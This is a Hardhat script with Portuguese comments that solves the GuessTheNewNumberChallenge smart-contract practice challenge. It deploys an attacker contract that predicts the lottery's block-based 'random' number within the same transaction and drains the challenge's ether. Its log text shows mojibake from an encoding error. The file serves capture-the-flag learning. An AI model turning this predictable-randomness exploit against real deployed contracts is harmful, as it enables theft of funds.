const hre = require("hardhat");

async function main() {
  console.log("ðŸ” Iniciando exploit do GuessTheNewNumberChallenge...\n");

  // O endereÃ§o do contrato pode ser passado como variÃ¡vel de ambiente
  // Se nÃ£o fornecido, fazemos o deploy primeiro
  let contractAddress = process.env.CONTRACT_ADDRESS;
  
  if (!contractAddress) {
    console.log("ðŸ“¦ Nenhum endereÃ§o fornecido. Fazendo deploy do contrato...\n");
    
    const [deployer] = await hre.ethers.getSigners();
    
    // Deploy do contrato enviando 1 ether
    const GuessTheNewNumberChallenge = await hre.ethers.getContractFactory("challenges/06_lottery_guess_new_number/contracts/GuessTheNewNumberChallenge.sol:GuessTheNewNumberChallenge");
    const guessChallenge = await GuessTheNewNumberChallenge.deploy({
      value: hre.ethers.parseEther("1.0")
    });
    await guessChallenge.waitForDeployment();
    contractAddress = await guessChallenge.getAddress();
    
    console.log("âœ… Contrato deployado em:", contractAddress);
    console.log("");
  }

  // Conectar ao contrato
  const GuessTheNewNumberChallenge = await hre.ethers.getContractFactory("challenges/06_lottery_guess_new_number/contracts/GuessTheNewNumberChallenge.sol:GuessTheNewNumberChallenge");
  const contract = GuessTheNewNumberChallenge.attach(contractAddress);

  // Obter contas
  const [attacker] = await hre.ethers.getSigners();
  
  // Verificar estado antes do exploit
  const balanceBefore = await hre.ethers.provider.getBalance(contractAddress);
  const isCompleteBefore = await contract.isComplete();
  
  console.log("ðŸ“ EndereÃ§o do contrato:", contractAddress);
  console.log("ðŸ‘¤ Atacante:", attacker.address);
  console.log("");
  console.log("ðŸ“Š Estado antes do exploit:");
  console.log("  - Saldo do contrato:", hre.ethers.formatEther(balanceBefore), "ETH");
  console.log("  - Desafio completo:", isCompleteBefore);
  console.log("");

  if (isCompleteBefore) {
    console.log("âœ… O desafio jÃ¡ estÃ¡ completo!");
    return;
  }

  // A melhor estratÃ©gia Ã© usar um contrato atacante que calcula e chama na mesma transaÃ§Ã£o
  // Isso garante que ambos usem o mesmo bloco
  console.log("ðŸ” Deployando contrato atacante...\n");
  
  const Attacker = await hre.ethers.getContractFactory("challenges/06_lottery_guess_new_number/contracts/Attacker.sol:Attacker");
  const attackerContract = await Attacker.deploy();
  await attackerContract.waitForDeployment();
  const attackerAddress = await attackerContract.getAddress();
  
  console.log("âœ… Contrato atacante deployado em:", attackerAddress);
  console.log("ðŸ’¡ O contrato atacante calcula e chama na mesma transaÃ§Ã£o, garantindo o mesmo bloco\n");

  // Executar o exploit atravÃ©s do contrato atacante
  console.log("ðŸŽ¯ Executando exploit atravÃ©s do contrato atacante...\n");
  
  const tx = await attackerContract.attack(contractAddress, {
    value: hre.ethers.parseEther("1.0")
  });
  console.log("ðŸ“¤ Transaction enviada:", tx.hash);
  
  await tx.wait();
  console.log("âœ… Transaction confirmada!\n");

  // Verificar estado apÃ³s o exploit
  const balanceAfter = await hre.ethers.provider.getBalance(contractAddress);
  const isCompleteAfter = await contract.isComplete();
  
  console.log("ðŸ“Š Estado apÃ³s o exploit:");
  console.log("  - Saldo do contrato:", hre.ethers.formatEther(balanceAfter), "ETH");
  console.log("  - Desafio completo:", isCompleteAfter);
  
  if (isCompleteAfter) {
    console.log("\nðŸŽ‰ Desafio completado! O nÃºmero foi calculado e adivinhado corretamente");
    console.log("ðŸ’° VocÃª recebeu 2 ether de volta (1 ether enviado + 1 ether de lucro)");
    console.log("ðŸ’¡ O contrato atacante garantiu que o cÃ¡lculo e a chamada usassem o mesmo bloco");
  } else {
    console.log("\nâŒ Algo deu errado. O desafio nÃ£o foi completado.");
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });

